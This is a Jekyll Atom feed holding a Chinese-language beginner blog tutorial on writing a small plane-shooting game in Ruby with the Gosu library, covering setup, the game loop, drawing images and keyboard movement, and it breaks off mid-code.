<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.1">Jekyll</generator><link href="http://0.0.0.0:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://0.0.0.0:4000/" rel="alternate" type="text/html" /><updated>2022-02-14T00:53:28+00:00</updated><id>http://0.0.0.0:4000/feed.xml</id><title type="html">My Blog</title><subtitle>某不知名的很硬的双非学校的物理系学生的无聊博客</subtitle><entry><title type="html">无聊的小游戏制作[进行中…]</title><link href="http://0.0.0.0:4000/ruby/i-am-boring/" rel="alternate" type="text/html" title="无聊的小游戏制作[进行中…]" /><published>2022-02-04T11:42:11+00:00</published><updated>2022-02-04T11:42:11+00:00</updated><id>http://0.0.0.0:4000/ruby/i-am-boring</id><content type="html" xml:base="http://0.0.0.0:4000/ruby/i-am-boring/">&lt;h1 id=&quot;ruby--gosu-make-a-game&quot;&gt;Ruby &amp;amp; Gosu Make A Game&lt;/h1&gt;
&lt;p&gt;之前的博客基本上是学习的笔记的记录, 感觉自己输出的有点少了, 
所以来点新鲜的, 写一个无聊的小游戏的制作, 
(又: 这个小游戏还是我在国航航班上玩到的一个小游戏, 有些魔性, 也有些好玩. )
来作为ruby的一个简单的推广.&lt;/p&gt;

&lt;p&gt;我会尽量只用最简单的知识来写的. 
(因为我只会简单的编程啊, 不会什么高级操作, 不知道能不能成功, 
这里就当做是一个记录吧. )&lt;/p&gt;

&lt;p&gt;(假如之后代码写得太烂了, 请不要喷. &lt;del&gt;狗头&lt;/del&gt;)&lt;/p&gt;

&lt;h2 id=&quot;前期准备&quot;&gt;前期准备&lt;/h2&gt;
&lt;h3 id=&quot;游戏设计和规划&quot;&gt;游戏设计和规划&lt;/h3&gt;
&lt;p&gt;虽然这个是一个很重要的事情, 但是因为我是一个复刻的操作(&lt;del&gt;老腾讯了&lt;/del&gt;), 
所以就省了. 简单介绍一下这个游戏的大概内容吧:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;就是飞机打障碍物&lt;/li&gt;
  &lt;li&gt;飞机撞到障碍物就会减血&lt;/li&gt;
  &lt;li&gt;飞机的子弹有三种模式: 单发, 双射, 四射&lt;/li&gt;
  &lt;li&gt;障碍物有数字来标记它剩下的血量&lt;/li&gt;
  &lt;li&gt;障碍物落到地上会弹回去&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;ruby-basic&quot;&gt;Ruby Basic&lt;/h3&gt;
&lt;p&gt;说实话, 我也没有什么系统地学过编程, 只有一点点基础, 
虽然我觉得应该是够用了. (虽然网上的Ruby教程很少, 并且质量也, 
挺一般的, 更多是像手册一样的参考资料. )&lt;/p&gt;

&lt;p&gt;这里列举一些我觉得很好用的资源吧:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.ruby-lang.org/en/documentation/quickstart/&quot;&gt;Ruby in 20 mins&lt;/a&gt;  &lt;br /&gt;
一开始我真的是看这个学的, &lt;del&gt;因为我比较怕麻烦&lt;/del&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://poignant.guide&quot;&gt;why’s (poignant) guide to ruby&lt;/a&gt;  &lt;br /&gt;
但是说起来, 这个教程才是我真正想学ruby的原因, &lt;del&gt;因为很帅&lt;/del&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;(嘛, 实在懒得学的话, 我觉得可以直接上手看代码, 这样简单一点. 
我下面的文章将假设你什么也不会, 直接开始也不是不行. 
如果你会一些编程基础的话, 还请直接跳过我的一些废话, 看看代码估计就很不错了. )&lt;/p&gt;

&lt;p&gt;安装方式看&lt;a href=&quot;https://www.ruby-lang.org/en/downloads/&quot;&gt;官网&lt;/a&gt;, 
windows下的话可以看看&lt;a href=&quot;https://rubyinstaller.org&quot;&gt;windowsInstaller&lt;/a&gt;, 
(温馨提示: 建议选择with devkit的版本的)
linux/mac下可以用&lt;a href=&quot;http://rvm.io&quot;&gt;rvm&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;(&lt;del&gt;假如遇到了网络的问题, 还请自行找可靠的方法, 不是&lt;/del&gt;, 
windowsInstaller有一个&lt;a href=&quot;https://rubyinstaller.cn&quot;&gt;国内的镜像&lt;/a&gt;, 
rvm没找到比较正式的方法)&lt;/p&gt;

&lt;h3 id=&quot;gems&quot;&gt;Gems&lt;/h3&gt;
&lt;p&gt;ruby的软件包管理器. 可以方便地安装已有的软件包, 并且解决软件包的安装问题, 
并且还可以发布自己的代码. 不过这个不是重点, 
我应该用到的就只有安装和删除等很少的功能.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;安装软件包&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gem install &amp;lt;package_name&amp;gt;&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;删除软件包&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gem remove &amp;lt;package_name&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;(&lt;a href=&quot;https://gems.ruby-china.com&quot;&gt;国内镜像网站&lt;/a&gt;, 并且还有配置的教程. )&lt;/p&gt;

&lt;p&gt;(用一个很中二的想法来看就是: gem就像是钢铁侠的武器库, 
可以随时随地地调用各种乱七八糟的神仙武器. )&lt;/p&gt;

&lt;h3 id=&quot;gosu&quot;&gt;Gosu&lt;/h3&gt;
&lt;p&gt;(遣词造句尝试解释失败, 直接复制粘贴&lt;a href=&quot;https://www.libgosu.org&quot;&gt;官网&lt;/a&gt;的介绍算了)&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Gosu is a 2D game development library for Ruby and C++.&lt;/p&gt;

  &lt;p&gt;It’s available for macOS, Windows, Linux, and iOS.&lt;/p&gt;

  &lt;p&gt;Gosu is focused, lightweight and has few dependencies (mostly SDL 2).&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;(关于GUI: 其实有一个叫做&lt;a href=&quot;http://shoesrb.com&quot;&gt;shoes&lt;/a&gt;的框架, 也是非常好用的, 
以前用过, 各种控件比较完善, 感觉适合简单的小程序的制作. 
可惜很久都没有更新了. &lt;del&gt;让人怀疑是不是跑路&lt;/del&gt;; 或者就是那种普普通通的gtk之类的, 
没有用过所以不太好说. )&lt;/p&gt;

&lt;p&gt;安装方式: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gem install gosu&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;(不知道windows的版本要不要什么devkit的安装)&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;简单的原理的介绍&lt;/strong&gt;:&lt;/p&gt;

&lt;p&gt;对于一个gosu程序的代码里面, 一般会有类似于下面的结构:&lt;/p&gt;

&lt;p&gt;(现在暂时不需要理解这些代码)&lt;/p&gt;

&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;require&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'gosu'&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;GameWindow&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Gosu&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Window&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;initialize&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;

  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;update&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;

  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;draw&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt; 
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;阅读&lt;a href=&quot;https://github.com/gosu/gosu/wiki/Window-Main-Loop&quot;&gt;文档&lt;/a&gt;
(虽然我只读了一点点), 可以知道在一个gosu的逻辑过程里面, 
有这样的一个循环过程: 接受输入, 更新&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;update&lt;/code&gt;, 然后是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;draw&lt;/code&gt;画出界面. 
(可能需要科学上网才能看到, 因为图片的原地址是github上的, 而github国内却时常抽风… )&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://github.com/gosu/gosu/wiki/main_loop.png&quot; alt=&quot;官方的图片&quot; title=&quot;这个图画的很形象了&quot; /&gt;&lt;/p&gt;

&lt;p&gt;这个的大概意思用&lt;strong&gt;离谱&lt;/strong&gt;代码来写就是:&lt;/p&gt;

&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kp&quot;&gt;loop&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;update&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;draw&lt;/span&gt;
  &lt;span class=&quot;nb&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;update_interval&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;大概的意思是这样的, 
于是只要按照这样的逻辑顺序在合适的位置上准备我们的代码就可以了.&lt;/p&gt;

&lt;h3 id=&quot;others&quot;&gt;Others&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;素材资源:
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;https://opengameart.org&quot;&gt;OpenGameArt&lt;/a&gt;  &lt;br /&gt;
是一个”开源”游戏素材库, 里面有很多的素材&lt;/li&gt;
      &lt;li&gt;自己画&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;basic&quot;&gt;Basic&lt;/h2&gt;
&lt;h3 id=&quot;basic-i-出现一个窗口&quot;&gt;Basic I: 出现一个窗口&lt;/h3&gt;
&lt;p&gt;选择一个自己顺手的路径并新建一个文件夹吧. 
然后新建一个ruby的代码文件, 不妨叫做&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main.rb&lt;/code&gt;吧.&lt;/p&gt;

&lt;p&gt;在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main.rb&lt;/code&gt;里面填写上上面的代码:&lt;/p&gt;

&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;require&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'gosu'&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;GameWindow&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Gosu&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Window&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;# 初始化&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;initialize&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# 设置窗口的大小, 宽度为480, 长度为680&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;super&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;480&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;680&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# 设置窗口的标题&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;caption&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Little Game&quot;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;

  &lt;span class=&quot;c1&quot;&gt;# 更新&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;update&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;

  &lt;span class=&quot;c1&quot;&gt;# 绘制界面&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;draw&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt; 
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;# 打开窗口&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;GameWindow&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;show&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;从头到脚开始看, 首先是一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;require&lt;/code&gt;语句, 
这个语句的作用是告诉ruby我们要使用一个叫做&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gosu&lt;/code&gt;的库. 
(当然, 前提是你已经安装了这个库, 假如没有, 请看上面的gosu介绍)&lt;/p&gt;

&lt;p&gt;接下来是一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;class ... end&lt;/code&gt;的结构, 我们只需要这就像是一个括号, 
里面包装的内容是什么不是特别重要, (因为这就是一种抽象的东西) 
重要的是我们用这样的括号定义了一个叫做&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GameWindow&lt;/code&gt;的东西, 
然后&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GameWindow &amp;lt; Gosu::Window&lt;/code&gt;说明的是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GameWindow&lt;/code&gt;是一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Gosu::Window&lt;/code&gt;的子类.&lt;/p&gt;

&lt;p&gt;类是一种面向对象编程思想里面的概念: 
面向对象程序设计可以看作一种在程序中包含各种独立而又互相调用的对象的思想, 
(来自&lt;a href=&quot;https://zh.wikipedia.org/wiki/面向对象程序设计&quot;&gt;wikipedia&lt;/a&gt;)
类似于这样: 有不同类型的玩具(对象), 不同的玩具有不同的功能和属性, 
同一类的玩具有相同的功能. 然后我们编程的时候就可以通过操作对象来完成各种操作. 
(就好像是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;toy.wear(:dress)&lt;/code&gt;就是让&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;toy&lt;/code&gt;对象穿上&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;:dress&lt;/code&gt;裙子, 
具体的话可以看看&lt;a href=&quot;https://poignant.guide/dwemthy/&quot;&gt;why的教程&lt;/a&gt;, 
我的翻译在&lt;a href=&quot;../../..//2021/11/20/Dwemthy's-array.html&quot;&gt;这里&lt;/a&gt;. 
假如不想深入了解的话, 展示先放放也不是不行. )&lt;/p&gt;

&lt;p&gt;那么我们先不管&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GameWindow&lt;/code&gt;里面发生了什么, 跳过这里看到下面的代码: 
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GameWindow.new&lt;/code&gt;告诉计算机我们要新建一个新的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GameWindow&lt;/code&gt;类的对象实例. 
对于ruby来说, 没新建一个对象实例的时候, 
就会自动的调用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;initialize&lt;/code&gt;方法来对这个对象进行初始化, 在这个初始化的过程中, 
我们可以设置很多关于这个对象的东西. 比如设置了窗口的大小, 窗口的标题等等.&lt;/p&gt;

&lt;p&gt;接下来又对这个对象调用了一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;show&lt;/code&gt;的方法(method), 让这个窗口能够显示出来. 
这个方法我们可以不必太关心它的实现, 因为这个是gosu库实现的.&lt;/p&gt;

&lt;p&gt;于是运行这段代码, 我们可以得到一个黑色的窗口:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/_img/i-am-boring/black-window.png&quot; alt=&quot;黑色窗口&quot; title=&quot;亘古之初, 啥也没有, 就是一坨黑&quot; /&gt;&lt;/p&gt;

&lt;p&gt;(虽然我用的是macOS, 但是windows子类的应该是类似的. )&lt;/p&gt;

&lt;p&gt;嗯, 是不是觉得这个黑色的窗口有一些单调, 那么我们可以为这个窗口加上一些背景, 
因为是太空设计小游戏, 所以我画了一个太空背景, 放在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rec&lt;/code&gt;文件夹中, 命名为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;background.png&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;为了让这个图片背景能够在我们的窗口中, 我们就需要把这个图片载入到程序里面, 
然后在画图的时候画出来在屏幕上, 为此, 我们需要修改一下代码:&lt;/p&gt;

&lt;p&gt;首先是载入图片:&lt;/p&gt;

&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;initialize&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# 设置窗口的大小&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;super&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;480&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;680&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;# 设置窗口的标题&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;self&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;caption&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Little Game&quot;&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;# 载入图片&lt;/span&gt;
    &lt;span class=&quot;vi&quot;&gt;@background&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Gosu&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Image&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;rec/background.png&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;其中&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@background&lt;/code&gt;是一个实例变量, 相较于普通的变量来说, 
实例变量是在一个实例内都可以随便访问的, 而普通的变量可以访问的范围是有限的. 
这是ruby里一个叫做scope(范围, 领域)的东西. 有点像是一个维恩图, 
变量的作用范围是被限定在有限范围的.&lt;/p&gt;

&lt;p&gt;这里之所以要使用实例变量, 是因为我们想要在初始化之后, 
可以在每一次绘制界面的时都直接调用这个背景图片, 然后让图片在窗口显示. 
假如只是普通变量的话, 那可就没法在不同的方法scope中访问了.&lt;/p&gt;

&lt;p&gt;于是我们就可以在绘制界面里面绘制图片了. 查阅文档:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;#draw(x, y, z = 0, scale_x = 1, scale_y = 1, color = 0xff_ffffff, mode = :default) =&amp;gt; void&lt;/p&gt;

  &lt;p&gt;Draws the image with its top left corner at (x, y).&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;这里暂时不必计较其他的参数, 只需要关心前两个参数, 也就是画图的位置.&lt;/p&gt;

&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;draw&lt;/span&gt;
    &lt;span class=&quot;vi&quot;&gt;@background&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;draw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这样就可以画出背景了. 这里解释一下, 在gosu中的坐标是以窗口的左上角为原点, 
向右为x轴正方向, 向下为y轴正方向.&lt;/p&gt;

&lt;h3 id=&quot;basic-ii-画一个飞机&quot;&gt;Basic II: 画一个飞机&lt;/h3&gt;
&lt;p&gt;射击游戏没有什么飞机开炮那不是太没意思了, 那么我们就画一个飞机吧. 
(嗯, 手绘板还在路上, 那么我就只好用笔记本的触摸板来展示一波灵魂画技吧. )&lt;/p&gt;

&lt;p&gt;为了方便操控, 我们不妨新建一个飞机的类:&lt;/p&gt;

&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# 飞机&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Plane&lt;/span&gt;      
  &lt;span class=&quot;c1&quot;&gt;# 初始化的时候在窗口的底部中间  &lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;initialize&lt;/span&gt;  
    &lt;span class=&quot;c1&quot;&gt;# @x, @y分别是横竖坐标  &lt;/span&gt;
    &lt;span class=&quot;vi&quot;&gt;@x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@y&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;240&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;600&lt;/span&gt;                                                                
    &lt;span class=&quot;c1&quot;&gt;# 飞机的图像  &lt;/span&gt;
    &lt;span class=&quot;vi&quot;&gt;@image&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;Gosu&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Image&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;rec/plane.png&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;     
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;                                                                                
  
  &lt;span class=&quot;c1&quot;&gt;# 画出飞机  &lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;draw&lt;/span&gt;  
    &lt;span class=&quot;vi&quot;&gt;@image&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;draw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;vi&quot;&gt;@x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;vi&quot;&gt;@y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;然后在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;initialize&lt;/code&gt;方法里面加入一些代码&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@player = Plane.new&lt;/code&gt;, 
在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;draw&lt;/code&gt;方法里面加入&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@player.draw&lt;/code&gt;, 这样就可以让飞机出现在屏幕上了.&lt;/p&gt;

&lt;p&gt;这里解释一下, 我们的飞机肯定是要在背景的上面的, 不然被背景遮住不是很尴尬? 
(这波我在你的上一层… )所以我们将&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Image#draw&lt;/code&gt;方法默认的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;z&lt;/code&gt;参数写成了&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1&lt;/code&gt;, 
也就是向上移动了一层, 显示在了背景上面.&lt;/p&gt;

&lt;p&gt;但是飞机肯定是要会飞的. 不会动还怎么玩? 这个时候我们就需要接受键盘的输入, 
然后控制飞机运动了. 为了达到这个目的, gosu里面提供了一个方法:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.button_down?(id)&lt;/code&gt; =&amp;gt; true, false&lt;/p&gt;

  &lt;p&gt;Returns whether the button &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;id&lt;/code&gt; is currently pressed. 
Button states are updated once per tick, 
so repeated calls during the same tick will always yield the same result.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;注意这一的&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;id&lt;/code&gt;也就是系统对应的键盘信号, 虽然每个系统的对应信号不一定一样, 
并且我们也没有必要真的知道是什么, 因为gosu库中已经为这些做好了封装, 
只要调用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Gosu::KB_LEFT&lt;/code&gt;等常量即可.&lt;/p&gt;

&lt;p&gt;这样我们就可以下手了, 在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GameWindow.update&lt;/code&gt;里面写一些代码:&lt;/p&gt;

&lt;div class=&quot;language-ruby highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  &lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;update&lt;/span&gt;                                                                         
    &lt;span class=&quot;vi&quot;&gt;@player&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;mv_left&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;button_down?&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Gosu&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;KB_LEFT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;                                   
    &lt;span class=&quot;vi&quot;&gt;@player&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;mv_right&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;button_down?&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;Gosu&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;KB_RIGHT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;                                 
